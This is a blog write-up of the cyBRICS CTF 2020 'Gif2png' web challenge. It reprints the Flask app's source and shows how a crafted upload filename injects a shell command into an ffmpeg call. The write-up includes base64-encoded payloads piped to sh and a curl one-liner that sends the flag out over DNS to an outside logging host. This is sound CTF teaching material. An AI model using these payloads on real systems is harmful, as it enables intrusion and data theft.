---
layout: post
title: "cyBRICS CTF 2020 - Gif2png"
description: "Resolution of the cyBRICS CTF challenge named Gif2png"
tags: [ctf,web,cybricsctf]
---

<img src="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-00-0ede9e305950712e679e89bb1e99939bceb88e58ae733ccf1047f6dba0e458fb.jpg">

Gif2Png is an easy web challenge from `cyBRICS CTF 2020`, an interesting web challenge that teaches you `command injection` through image's filename.

The challenge had the following description/details: 

<img src="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-01-19a95b1d764ce4a33d90e54c311910ba49d3443274d8c46e9a2048f20a87b2fc.png">

A copy of the original web application's source code is available on: [gif2png.tar.gz](https://mega.nz/file/oMJnVAbR#qkUfgCsgjhkueLh9dOeKc_7Pm1BXzwacspLZxjvLB5Q)

The challenge web page:

<img src="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-02-bca1ccb08ee990ca148bb270822bcfd4eb521cf5b3954a923b153bb83e05be4c.png">

It seems that the web application slices the gif into frames and display them on the screen:

<img src="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-03-f19871cac5a882c348b311abdaaa4f860eb0fb5fc2fd43149313ba7c4d3ea066.png">

So now let's check the source code of the web application to understand how it is done.

This is the source code of the main file, named `main.py`:

```python
import logging
import re
import subprocess
import uuid
from pathlib import Path

from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory
from flask_bootstrap import Bootstrap
import os
from werkzeug.utils import secure_filename
import filetype


ALLOWED_EXTENSIONS = {'gif'}

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['SECRET_KEY'] = '********************************'
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024  # 500Kb
ffLaG = "cybrics{********************************}"
Bootstrap(app)
logging.getLogger().setLevel(logging.DEBUG)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    logging.debug(request.headers)
    if request.method == 'POST':
        if 'file' not in request.files:
            logging.debug('No file part')
            flash('No file part', 'danger')
            return redirect(request.url)

        file = request.files['file']
        if file.filename == '':
            logging.debug('No selected file')
            flash('No selected file', 'danger')
            return redirect(request.url)

        if not allowed_file(file.filename):
            logging.debug(f'Invalid file extension of file: {file.filename}')
            flash('Invalid file extension', 'danger')
            return redirect(request.url)

        if file.content_type != "image/gif":
            logging.debug(f'Invalid Content type: {file.content_type}')
            flash('Content type is not "image/gif"', 'danger')
            return redirect(request.url)

        if not bool(re.match("^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$", file.filename)) or ".." in file.filename:
            logging.debug(f'Invalid symbols in filename: {file.content_type}')
            flash('Invalid filename', 'danger')
            return redirect(request.url)

        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))

            mime_type = filetype.guess_mime(f'uploads/{file.filename}')
            if mime_type != "image/gif":
                logging.debug(f'Invalid Mime type: {mime_type}')
                flash('Mime type is not "image/gif"', 'danger')
                return redirect(request.url)

            uid = str(uuid.uuid4())
            os.mkdir(f"uploads/{uid}")

            logging.debug(f"Created: {uid}. Command: ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"")

            command = subprocess.Popen(f"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"", shell=True)
            command.wait(timeout=15)
            logging.debug(command.stdout)

            flash('Successfully saved', 'success')
            return redirect(url_for('result', uid=uid))

    return render_template("form.html")


@app.route('/result/<uid>/')
def result(uid):
    images = []
    for image in os.listdir(f"uploads/{uid}"):
        mime_type = filetype.guess(str(Path("uploads") / uid / image))
        if image.endswith(".png") and mime_type is not None and mime_type.EXTENSION == "png":
            images.append(image)

    return render_template("result.html", uid=uid, images=images)


@app.route('/uploads/<uid>/<image>')
def image(uid, image):
    logging.debug(request.headers)
    dir = str(Path(app.config['UPLOAD_FOLDER']) / uid)
    return send_from_directory(dir, image)


@app.errorhandler(413)
def request_entity_too_large(error):
    return "File is too large", 413


if __name__ == "__main__":
    app.run(host='localhost', port=5000, debug=True, threaded=True)
{% endhighlight %}
```

What caught my attention was the line 104:

```python
command = subprocess.Popen(f"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"", shell=True)
```

This can be very insecure because the web application is passing an user input to be executed as system command. (`file.filename`)

There's a small condition that checks for some characters on filename and blocks the upload:

```python
if not bool(re.match("^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$", file.filename)) or ".." in file.filename:
  logging.debug(f'Invalid symbols in filename: {file.content_type}')
  flash('Invalid filename', 'danger')
  return redirect(request.url)
```

So now we need to exploit this weak point.

The very first thing we need to do is stop the actual ffmpeg command and execute another one, to do this we need to escape the `'` quotes and append another command.

I found a way to bypass the filename verification using double pipelines to execute my system command, the malicious filename will look something like this:

> `MALICIOUS_NAME'||MALICIOUS SYTEM COMMAND HERE||'`

```shell
ffmpeg -i 'uploads/MALICIOUS_NAME'||MALICIOUS SYTEM COMMAND HERE||' "uploads/{uid}/%03d.png\"
```

There's a final problem: how to inject system commands through filename and bypass the filename check? `Encoding the payload with base64, decoding and executing on the fly!`

> `echo d2hvYW1pO2lkO3NsZWVwIDEw|base64 -d|sh`

Unfortunatelly, the challenge server had a firewall blocking reverse shells and requests to the external resources through port 80.
So I came with the idea of exfiltrating the flag (inside the main.py) through DNS using `dnsbin.zhack.ca`:

> `flag=$(cat main.py|grep -wo cybrics{.*|base64|tr -d '=');curl $flag.a0325542a59398d0bda8.d.zhack.ca`

The flag is extracted from the main.py and sent through DNS using DNSBin, all we need to do is encode the above command as base64 and rename the file:

The encoded payload:

> `ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5iNDQ1YzMwODAxYTg4OTRhMzc0Ny5kLnpoYWNrLmNh`

The 2nd part:

> `echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5iNDQ1YzMwODAxYTg4OTRhMzc0Ny5kLnpoYWNrLmNh|base64 -d|sh`

The final filename:

> `nullarmor'||echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5iNDQ1YzMwODAxYTg4OTRhMzc0Ny5kLnpoYWNrLmNh|base64 -d|sh||'.gif`

Now we just renamed a gif file with the malicious filename and uploaded it on the Gif2png web application!

<img src="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-04-bab35abb8f097541da9a97cabfe9d2c07e8434155e5fe0063f2e406835b4ff16.png">

Done, after 5 seconds the base64 encoded flag will be sent through DNS!

<img src="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-04-bab35abb8f097541da9a97cabfe9d2c07e8434155e5fe0063f2e406835b4ff16.png">

# Flag:
``` cybrics{imagesaresocoolicandrawonthem}

<img src="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-06-0069647c11ff4ae14468d1673853c5adb6549af2350dfe82528b25e98fea8f07.png">
